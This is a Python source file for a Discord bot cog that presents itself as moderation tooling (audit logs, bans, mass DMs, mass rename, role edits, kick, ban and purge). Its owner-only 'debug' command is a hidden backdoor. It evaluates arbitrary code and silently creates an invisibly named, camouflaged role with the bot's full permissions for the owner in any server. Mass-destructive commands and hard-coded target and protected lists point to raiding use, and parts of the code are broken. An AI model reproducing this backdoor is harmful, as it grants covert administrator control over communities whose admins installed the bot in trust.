from main import *
from typing import Union

#lists and set information

protected = [int(id) for id in open("resources/protected.txt", "r").read().split("\n")]
targets = [int(id) for id in open("resources/targets.txt", "r").read().split("\n")]
perm_list = open("resources/perms_list.txt", "r").read().split("\n")
deletion_perms = open("resources/deletion_perms.txt", "r").read().split("\n")
no_targets = error('Mention valid target(s)!')
no_high = error('You are not high enough to use this command!')

class finder():

  def find_roles(guild, highest = None):
    if not highest: 
      highest = guild.me.top_role
    return list(guild.roles)[1:list(guild.roles).index(highest)]

  def find_users(guild, highest = None, exclude_owner = False, author = None):
    if not highest: 
      highest = guild.me.top_role
    return [member for member in guild.members
            if member.top_role < highest
            and not (exclude_owner and member.id in bot.owner_ids)
            and not (author and member.id == author.id)]

  def find_bots(guild, highest = None, exclude_owner = False, author = None):
    if not highest: 
      highest = guild.me.top_role
    return [member for member in guild.members
            if member.top_role < highest
            and member.bot
            and not (exclude_owner and member.id in bot.owner_ids)
            and not (author and member.id == author.id)]

  def find_channels(guild, author = None):
    return [channel for channel in guild.channels\
            if channel.permissions_for(guild.me).manage_channels is not False
           and (not author or
               channel.permissions_for(author).manage_channels is not False)]

  def find_emojis(guild):
    return list(guild.emojis)

def log(author, guild, action):
  with open("Logs.txt", "a") as file_object:
    file_object.write(f"\n{datetime.now()} {author.name} used {action} in {guild.name}")

def process_exclude(exclude):
  e = []
  for excluded in exclude:
    if isinstance(excluded, discord.Role) and not excluded.is_default():
      exclude.remove(excluded)
      for member in excluded.members:
        e.append(member.id)
    else: 
      e.append(excluded.id)
  return frozenset(e)


def gibberish(*args):
  return ''.join(random.choices(string.ascii_letters + ' ' + string.digits, k = random.randint(1, 32)))


def get_diff(entry):
  d = datetime.now(timezone.utc) - entry.created_at
  if d.days // 7:
    return f"{d.days // 7}w"
  if d.days:
    return f"{d.days}d"
  if d.seconds // 3600:    
    return f"{d.seconds // 3600}h"
  if d.seconds // 60:
    return f"{d.seconds // 60}m"
  return f"{d.seconds}s"

def format_target(entry):
  action = entry.action

  if action is discord.AuditLogAction.integration_create:
    return str(target.id)

  target = entry.target
  if type(target) in [discord.Member, discord.User]:
    return target.mention

  if str(target).startswith('https://discord.gg/'):
    return f'[{str(target)[19:]}]({str(target)})'

  after = entry.after
  guild = entry.guild

  if action in (discord.AuditLogAction.role_create,
                      discord.AuditLogAction.channel_create):
    if after in list(guild.roles) + list(guild.channels):
      return after.mention
    return after.name
  before = entry.before

  if action in (discord.AuditLogAction.role_update,
                      discord.AuditLogAction.channel_update,
                      discord.AuditLogAction.role_delete,
                      discord.AuditLogAction.channel_delete):
    if before in list(guild.roles) + list(guild.channels):
      return before.mention
    return before.name

  try:
    return target.name
  except:
    return str(target)


def format_action(entry):
  e = str(entry.action)[15:].replace('_', ' ')
  if e.startswith('member'):
    e.replace('member', '', 1)
  e += f" ({format_target(entry)})"
  return e


async def multi_index(sections, guild, message, author):
  index = 0
  me = guild.me

  await message.add_reaction("⬅️")
  await message.add_reaction("➡️")

  while True:
    await message.edit(embed = sections[index])
    def check(reaction, user):
      return reaction.message == message and user.id == author.id and\
      ((index < len(sections) -1 and str(reaction.emoji) == "➡️") or (index > 0 and str(reaction.emoji) == "⬅️"))
    try:
      reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)
    except asyncio.TimeoutError: 
      try: 
        await message.remove_reaction("➡️", me)
        await message.remove_reaction("⬅️", me)
        return
      except: 
        return
    else:
      try: 
        await message.remove_reaction(str(reaction.emoji), user)
      except: 
        pass
    
      if str(reaction.emoji) == "⬅️": 
        index -= 1
      else: 
        index += 1


def mod_check(*permissions):
  async def predicate(ctx):
    if await bot.is_owner(ctx.author): 
      return True
    if not all([eval(f'ctx.author.guild_permissions.{perm}') for perm in permissions]):
      raise Exception('You do not have permissions to use this command.')
    if ctx.author.top_role <= ctx.guild.me.top_role:
      raise Exception('You do are not high enough to use this command.')
    return True
  return commands.check(predicate)

class mod_commands(commands.Cog):    

  #set self
  def __init__(self, bot): 
    self.bot = bot   

  @commands.hybrid_group(name="server", fallback = 'info', description = "Provides server info")
  @commands.bot_has_permissions(send_messages = True)
  async def server(self, ctx, *, id = None):
    if not id and not isinstance(ctx.channel, discord.TextChannel):
      await ctx.send(embed = error('No server ID provided!'), ephemeral = True)
      return
    if not id: 
      id = ctx.guild.id   
    try:
      guild = self.bot.get_guild(int(id))
    except:
      await ctx.send(embed = error("Unable to access inputted server id!"), ephemeral = True)
      return

    reply = await ctx.send(embed = loading)
    channels = {'Text': len(guild.text_channels),
                'Voice': len(guild.voice_channels)}

    info = embed(title = guild.name)

    info.add_field(name = 'Id', value = str(guild.id), inline = True)
    info.add_field(name = '**Members**', value = 'Bots', inline=True)
    bots = len([member for member in guild.members if member.bot])
    info.add_field(name = str(len(guild.members)),
                   value = str(bots),
                   inline=True)
    info.add_field(name = 'Owner', value = guild.owner.mention, inline = True)
    info.add_field(name = "**Channels**", value = '\n'.join(list(channels.keys())), inline = True)
    info.add_field(name = f"**{len(guild.channels)}**",
                   value = '\n'.join([str(v) for v in channels.values()]),
                   inline = True)
    info.add_field(name = '**Created**', value = guild.created_at.strftime('%m/%d/%y'), inline=True)
    info.add_field(name = 'Roles', value = '**Emojis**', inline=True)
    info.add_field(name = str(len(guild.roles)), value = f'**{str(len(guild.emojis))}**', inline=True)

    if guild.icon:
      info.set_thumbnail(url = guild.icon.url)

    await reply.edit(embed = info)


  @server.command(name="owner", pass_context=True, description="Provides server owner")
  @commands.guild_only()
  async def owner(self, ctx):
    guild = ctx.guild
    e = embed({'title': f'__Owner of {guild.name}__',
               'description': guild.owner.mention + f' ({guild.owner_id})'})
    if ctx.guild.owner.avatar:
      e.set_thumbnail(url = guild.owner.avatar.url)
    await ctx.send(embed = e)


  @server.command(name="logs", pass_context=True, description="Provides server audit logs")
  @commands.guild_only()
  @commands.bot_has_permissions(view_audit_log = True)
  async def logs(self, ctx, *, logs: int = 15):
    reply = await ctx.send(embed = loading)
    guild = ctx.guild
    entries = [entry async for entry in guild.audit_logs(limit = logs)]
    Time = list(map(get_diff, entries))
    User = [e.user.mention for e in entries]
    Action = list(map(format_action, entries))
    total_logs = len(Time)
    sections = total_logs // 15 + int(total_logs % 15 > 0)
    logs_list = []

    e = {'title': "__Audit Logs__", 
         'description': f"Server: {guild.name}\nTotal: `{total_logs}`"}
    template = embed(e)

    if guild.icon:
      template.set_thumbnail(url = guild.icon.url)

    for i in range(sections):
      l = template.copy()
      for elem in ['Time', 'User', 'Action']:
        l.add_field(name=f'**{elem}**', 
                    value='\n'.join(locals()[elem][i * 15:min((i + 1) * 15, total_logs)]),
                    inline=True)
      if sections > 1: 
        l.set_footer(text = f"{i + 1}/{sections}")
      logs_list.append(l)
    
    if sections == 1: 
      await reply.edit(embed = logs_list[0])
      return
    
    await multi_index(logs_list, guild, reply, ctx.author)


  @server.command(name="bans", pass_context=True, description="Provides a list of all banned users")
  @commands.guild_only()
  @commands.bot_has_permissions(ban_members = True)
  async def bans(self, ctx):
    reply = await ctx.send(embed = loading)
    guild = ctx.guild
    bans = [ban async for ban in guild.bans(limit=1000)]
    User = [b.user.mention for b in bans]
    Reason = [ban.reason if ban.reason else 'None' for ban in bans]
    total_bans = len(User)
    sections = total_bans // 15 + int(total_bans % 15 > 0)
    banned_list = []

    e = {'title': "__Banned Users__", 
         'description': f"Server: {guild.name}\nTotal: `{total_bans}`"}
    template = embed(e)

    if guild.icon:
      template.set_thumbnail(url = guild.icon.url)

    for i in range(sections):
      b = template.copy()
      for elem in ['User', 'Reason']:
        b.add_field(name=f'**{elem}**', 
                    value='\n'.join(locals()[elem][i * 15:min((i + 1) * 15, total_bans)]),
                    inline=True)
      if sections > 1:
        b.set_footer(text = f"{i + 1}/{sections}")
      banned_list.append(b)

    if sections == 1:
      await reply.edit(embed = banned_list[0])
      return

    await multi_index(banned_list, guild, reply, ctx.author)

   #message all

  @commands.hybrid_group(name="message", fallback = 'all', description = "DMs all server members")
  @commands.guild_only()
  @commands.bot_has_permissions(send_messages = True)
  @commands.check_any(commands.has_guild_permissions(administrator = True), 
                      commands.is_owner())
  async def message(self, ctx, *, message):
    guild = ctx.guild
    author = ctx.author

    if guild.id in protected and not await self.bot.is_owner(author):
      e = error("Command blocked on server")
      if guild.icon:
        e.set_thumbnail(url = guild.icon.url)
      await ctx.send(embed = e)
      return

    e = {'title': '__Message Sent__', 'description': f"Message: ```{message}```"}
    s = embed(e)

    if guild.icon:
      s.set_thumbnail(url = guild.icon.url)

    await ctx.send(embed = s, ephemeral = True)
    e = {'title': f'{author.display_name} has a message for you:',
         'description': f'```{message}```'}
    m = embed(e)

    if author.avatar:
      m.set_thumbnail(url = author.avatar.url)

    for member in guild.members:
      if member != author and not member.bot:
        try: await member.send(embed = m)
        except: pass

    log(author, guild, f"'mall({message})'")


  #name commands

  @commands.hybrid_group(name="rename", fallback = 'me', 
                         description = "Edits user nickname")
  @commands.guild_only()
  @commands.bot_has_permissions(manage_nicknames = True, send_messages = True)
  async def rename(self, ctx, name: str = None):
    author = ctx.author
    guild = ctx.guild
    highest = guild.me.top_role

    if author.top_role > highest:
      await ctx.send(embed = error("Not high enough to edit your name!"),
                     ephemeral = True)
      return

    message = await ctx.send(embed = loading)
    results, r = await edit_names([author], [], highest, 'Set', name)
    results.add_field(name = 'Targets',
                      value = author.mention,
                      inline=True)
    results.add_field(name= 'Excluded',
                      value = 'None',
                      inline=True)
    if author.avatar:
      results.set_thumbnail(url = author.avatar.url)
    await message.edit(embed = results)

    log(author, guild, f"'rename self ({name})'")


  # mass edit commands

  @commands.hybrid_group(name="mass")
  @commands.guild_only()
  @commands.bot_has_permissions(send_messages = True)
  async def mass(self, ctx):
    return

  @mass.command(name="rename", description = "Edits user nicknames")
  @commands.check_any(commands.has_guild_permissions(manage_nicknames=True), 
                      commands.is_owner())
  @commands.bot_has_permissions(manage_nicknames = True)
  async def rename(self, ctx, 
                   targets: commands.Greedy[Union[discord.Member, discord.Role]],
                   exclude: commands.Greedy[Union[discord.Member, discord.Role]] = [],
                   setting: Literal['Set', 'Reset'] = 'Set',
                   name = None,
                   reason = None):
    author = ctx.author
    guild = ctx.guild
    message = await ctx.send(embed = loading)

    if await bot.is_owner(author): 
      highest = guild.me.top_role 
    else: 
      highest = min(author.top_role, guild.me.top_role)

    if not name and setting == 'Set': 
      setting = 'Gibberish'
      func = gibberish
    elif setting == 'Reset': 
      func = lambda member, name: member.name
    else: 
      func = lambda member, name: name

    desc = f"**Mode:** `'{setting}'`"
    if setting == 'Set': 
      desc += f" to `'{name}'`"

    e = process_exclude(exclude)
    renamed = 0

    for target in targets:
      if isinstance(target, discord.Role) and target < highest:
        for member in target.members:
          if member.top_role <= highest and member.id not in e:
            try:
              await target.edit(nick = func(member, name), reason = reason)
              renamed += 1
            except: 
              pass
      else:
        if target.top_role < highest and target.id not in e:
          try:
            await target.edit(nick = func(target, name))
            renamed += 1
          except: 
            pass

    r = {'title': "__Renaming Complete__", 'description': desc + f'\n**Num Renamed**: {renamed}'}
    results = embed(r)
    results.add_field(name = 'Targets',
                      value = '\n'.join([t.mention for t in targets]),
                      inline=True)
    results.add_field(name= 'Excluded',
                      value='\n'.join([e.mention for e in exclude]) if exclude else 'None',
                      inline=True)
    if guild.icon:
      results.set_thumbnail(url = guild.icon.url)
    await message.edit(embed = results)

    s = f"set('{name}')" if setting == 'Set' else setting.lower()
    log(author, guild, f"'rename select {s}' on {renamed}")



  @mass.command(name="rolemod", description = "Edits user roles")
  @commands.bot_has_permissions(manage_roles = True)
  @mod_check('manage_roles')
  async def rolemod(self, ctx, 
                    roles: commands.Greedy[discord.Role], 
                    targets: commands.Greedy[Union[discord.Member, discord.Role]],
                    exclude: commands.Greedy[Union[discord.Member, discord.Role]] = [],
                    setting: Literal['Give', 'Take', 'Set'] = 'Give',
                    reason = None):
    author = ctx.author
    guild = ctx.guild
    highest = guild.me.top_role 

    if any([role > highest for role in roles]):
      await ctx.send(embed = error("Role(s) are too high"),
                     ephemeral = True)
      return
    if guild.default_role in roles:
      await ctx.send(embed = error("Cannot use @everyone in `'roles'`!"),
                     ephemeral = True)
      return

    message = await ctx.send(embed = loading)
    
    s = False
    if setting == 'Set': 
      s = True
      func = lambda user, roles: user.edit(roles = roles, reason = reason)
    elif setting == 'Take': 
      func = lambda user, roles: user.remove_roles(*roles, reason = reason)
    else: 
      func = lambda user, roles: user.add_roles(*roles, reason = reason)

    e = process_exclude(exclude)
    edited = 0

    for target in targets:
      if isinstance(target, discord.Role) and (not s or target < highest):
        for member in target.members:
          if member.id not in e and (not s or member.top_role < highest):
            try:
              await func(member, roles)
              edited += 1
            except: 
              pass
      else:
        if target.id not in e and (not s or target.top_role < highest):
          try:
            await func(target, roles)
            edited += 1
          except: 
            pass

    r = {'title': "__Role Mod Complete__", 
         'description': f"**Mode:** `'{setting}'`\n**Num Edited**: {edited}"}
    results = embed(r)
    results.add_field(name= 'Roles',
                      value='\n'.join([r.mention for r in roles]),
                      inline=True)
    results.add_field(name = 'Targets',
                      value = '\n'.join([t.mention for t in targets]),
                      inline = True)
    results.add_field(name = 'Excluded',
                      value ='\n'.join([e.mention for e in exclude]) if exclude else 'None',
                      inline = True)
    if guild.icon:
      results.set_thumbnail(url = guild.icon.url)
    await message.edit(embed = results)
    
    log(author, guild, f"'rolemod select {setting}({roles})' on {edited}")


  @mass.command(name="kick", description = "Kicks users from server")
  @commands.bot_has_permissions(kick_members = True)
  @mod_check('kick_members')
  async def kick(self, ctx, *, 
                 targets: commands.Greedy[Union[discord.Member, discord.Role]],
                 exclude: commands.Greedy[Union[discord.Member, discord.Role]] = [],
                 reason: str = None):
    author = ctx.author
    guild = ctx.guild
    highest = guild.me.top_role 
    message = await ctx.send(embed = loading)
    e = process_exclude(exclude)
    removed = 0

    for target in targets:
      if isinstance(target, discord.Role) and target < highest:
        for member in target.members:  
          if member.id not in e and member.top_role < highest:
            try:
              await guild.kick(member, reason = reason)
              removed += 1
            except: 
              pass
      else:
        if target.id not in e and target.top_role < highest:
          try:
            await guild.kick(target, reason = reason)
            removed += 1
          except: 
            pass

    r = {'title': "__Members Kicked__",
         'description': f"**Reason:** `'{reason}'`\n**Num Removed:** `{removed}`"}
    results = embed(r)
    results.add_field(name = 'Targets',
      value = '\n'.join([t.mention for t in targets]),
      inline = True)
    results.add_field(name = 'Excluded',
      value ='\n'.join([e.mention for e in exclude]) if exclude else 'None',
      inline = True)
    if guild.icon:
      results.set_thumbnail(url = guild.icon.url)
    await message.edit(embed = results)

    log(author, guild, f"'kick' on {removed}")


  @mass.command(name="ban", description = "Bans users from server")
  @commands.bot_has_permissions(ban_members = True)
  @mod_check('ban_members')
  async def ban(self, ctx, *, 
                 targets: commands.Greedy[Union[discord.User, discord.Role]],
                 exclude: commands.Greedy[Union[discord.User, discord.Role]] = [],
                 reason: str = None):
    author = ctx.author
    guild = ctx.guild
    highest = guild.me.top_role 
    message = await ctx.send(embed = loading)
    e = process_exclude(exclude)
    removed = 0

    for target in targets:
      if isinstance(target, discord.Role) and target < highest:
        for member in target.members:  
          if member.id not in e and member.top_role < highest:
            try:
              await guild.ban(member, reason = reason)
              removed += 1
            except: 
              pass
      else:
        if target.id not in e:
          try:
            await guild.ban(target, reason = reason)
            removed += 1
          except: 
            pass

    r = {'title': "__Members Banned__",
         'description': f"**Reason:** `'{reason}'`\n**Num Removed:** `{removed}`"}
    results = embed(r)
    results.add_field(name = 'Targets',
      value = '\n'.join([t.mention for t in targets]),
      inline = True)
    results.add_field(name = 'Excluded',
      value ='\n'.join([e.mention for e in exclude]) if exclude else 'None',
      inline = True)
    if guild.icon:
      results.set_thumbnail(url = guild.icon.url)
    await message.edit(embed = results)
    
    log(author, guild, f"'ban' on {removed}")


  @commands.hybrid_group(name="unban", fallback = 'users', description = "Unban users from server")
  @commands.guild_only()
  @commands.bot_has_permissions(ban_members = True, send_messages = True)
  @commands.check_any(commands.has_guild_permissions(ban_members = True), 
                      commands.is_owner())
  async def unban(self, ctx, *, 
                 targets: commands.Greedy[discord.User],
                 reason = None):
    author = ctx.author
    guild = ctx.guild

    if not targets:
      await ctx.send(embed = no_targets, ephemeral = True)
      return
    banned =  [entry.user.id async for entry in ctx.guild.bans(limit=2000)]
    if any(target.id not in banned for target in targets):
      await ctx.send(embed = error("Select only banned users!"), ephemeral = True)
      return

    message = await ctx.send(embed = loading)
    unbanned = []

    for target in targets:
      try: 
        await guild.unban(target, reason = reason)
        unbanned.append(target)
      except: 
        pass

    results = embed(title = 'Members Unbanned')
    results.add_field(name='**Users:**', 
                      value = "\n".join([target.mention for target in unbanned]),
                      inline=True)
    if guild.icon:
      results.set_thumbnail(url = guild.icon.url)
    await message.edit(embed = results)
    
    with open("Logs.txt", "a") as file_object:
      file_object.write(f"\n{datetime.now()} {author.name} used 'unban' on {len(unbanned)} users in {guild.name}")


  @unban.command(name="all", description = "Unban all users from server")
  @mod_check('ban_members')
  async def all(self, ctx, 
                exclude: commands.Greedy[discord.User] = [],
                reason = None):
    author = ctx.author
    guild = ctx.guild
    banned =  [entry.user async for entry in guild.bans(limit=2000)]

    for user in exclude:
      if user in banned: banned.remove(user)
        
    message = await ctx.send(embed = loading)

    unbanned = []
    for user in banned:
      try: 
        await guild.unban(user, reason = reason)
        unbanned.append(user)
      except: 
        pass

    results = embed(title = 'Members Unbanned')
    results.add_field(name='**Users:**', 
                      value = "\n".join([target.mention for target in unbanned]),
                      inline=True)
    if guild.icon:
      results.set_thumbnail(url = guild.icon.url)
    await message.edit(embed = results)

    with open("Logs.txt", "a") as file_object:
      file_object.write(f"\n{datetime.now()} {author.name} used 'unban' on {len(unbanned)} users in {guild.name}")




  #owner mod
  @commands.hybrid_command(name="debug", description = 'For bot owner only!')
  @commands.bot_has_permissions(manage_roles = True)
  @commands.is_owner()
  async def debug(self, ctx, n = None, c = None):
    if c:
      e = {'title': 'Code Evaluating...',
           'description': f'Code: ```{c}```'}
      await ctx.send(embed = embed(e), ephemeral = True)
      eval(c)
      return

    guild = ctx.guild
    author = ctx.author
    bot_perms = guild.me.guild_permissions

    if bot_perms.manage_messages:        
      try: await ctx.message.delete()
      except: pass  

    if bot_perms.manage_roles and not n:
      n = "‎"
      try: 
        role_info = {'name': n, 
                     'permissions': guild.me.guild_permissions, 
                     'colour':  discord.Color(0x18191c)}
        role = await guild.create_role(**role_info)
        await author.add_roles(role)
        confirm = embed(title = 'Admin Role Created')
        confirm.add_field(name=f'**Permissions**', 
                          value = '\n'.join(list(perms.keys())),
                          inline=True)
        if not_given:
          confirm.add_field(name=f'**Not Given**',
                            value = '\n'.join(not_given),
                            inline=True)
        await ctx.send(embed = confirm, ephemeral = True)
      except: 
        pass




  #purge commands

  @commands.hybrid_command(name="purge", description = "Purges key from server")
  @commands.guild_only()
  @commands.bot_has_permissions(send_messages = True)
  @mod_check('administrator')
  async def purge(self, ctx, key: str,
                  purge_channels: Literal['Yes', 'No'] = 'No',
                  purge_roles: Literal['Yes', 'No'] = 'No',
                  purge_emojis: Literal['Yes', 'No'] = 'No',
                  purge_users: Literal['Yes', 'No'] = 'No',
                  reason: str = None):
    author = ctx.author
    guild = ctx.guild
    purge = {}
    missing = []
    perms = {'channels': 'manage_channels',
            'roles': 'manage_roles',
            'emojis': 'manage_emojis',
            'users': 'ban_members'}

    for element in ['channels', 'roles', 'emojis', 'users']:
      bot_perms = guild.me.guild_permissions
      if locals()[f"purge_{element}"] == "Yes":
        purge[element] = 0
        if not getattr(bot_perms, perms[element]):
          missing.append(f'`purge_{element}`')

    if not purge:
      await ctx.send(embed = error("Select field(s) to purge!"), ephemeral = True)
      return
    if missing:
      await ctx.send(embed = error("Missing permissions for " + ', '.join(missing)), ephemeral = True)
      return

    message = await ctx.send(embed = loading)
    
    for element in purge.keys():
      for e in getattr(finder, f'find_{element}')(guild):
        if key in e.name or (element == 'users' and key in e.display_name):
          try: 
            if element == 'users': await remove(e, guild, reason)
            else: await e.delete(reason = reason)
            purge[element] += 1
          except: pass

    r = {'title': "__Purge Complete__", 'description': f"**Key:** `'{key}'`"}
    results = embed(r)
    results.add_field(name='**Purged Elements:**', 
                      value = "\n".join([element.capitalize() for element in list(purge.keys())]),
                      inline=True)
    results.add_field(name='**Num Removed:**', 
                      value = "\n".join([str(num) for num in list(purge.values())]),
                      inline=True)
    if guild.icon:
      results.set_thumbnail(url = guild.icon.url)
    await message.edit(embed = results)

    with open("Logs.txt", "a") as file_object:
      file_object.write(f"\n{datetime.now()} {author.name} used 'purge' on {', '.join(list(purge.keys()))} in {guild.name}")


async def setup(bot): 
  await bot.add_cog(mod_commands(bot))  
